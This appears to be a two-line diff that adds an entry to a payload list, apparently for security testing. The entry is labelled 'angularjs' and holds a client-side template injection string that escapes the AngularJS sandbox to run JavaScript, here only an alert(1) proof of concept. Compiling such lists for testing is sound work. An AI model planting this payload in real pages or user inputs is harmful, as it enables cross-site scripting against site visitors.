@@ -1,0 +1,2 @@
+angularjs
+{{constructor.constructor('alert(1)')()}}
